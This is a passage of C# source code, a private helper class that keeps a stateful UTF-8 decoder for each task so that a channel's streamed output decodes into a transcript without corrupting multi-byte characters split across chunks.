    // per-chunk GetString would corrupt the transcript at every split. The
    // decoder holds the partial bytes and completes the character on the next
    // chunk, so the transcript decodes what the channel actually printed.
    // Invalid sequences decode to the replacement character, the documented
    // lossy behavior for a text transcript carrying non-UTF-8 output. The
    // reader loop is the sole writer, so a plain Dictionary is safe; the
    // decoders die with the stream, matching the channel's session scope.
    private sealed class ChannelDecoders
    {
        private readonly Dictionary<Guid, Decoder> _byTask = new();

        public string Decode(Guid taskId, ReadOnlySpan<byte> data)
        {
            if (!_byTask.TryGetValue(taskId, out var decoder))
            {
                decoder = Encoding.UTF8.GetDecoder();
                _byTask[taskId] = decoder;
            }

            var chars = new char[decoder.GetCharCount(data, flush: false)];
            var written = decoder.GetChars(data, chars, flush: false);
            return new string(chars, 0, written);
        }
    }
}
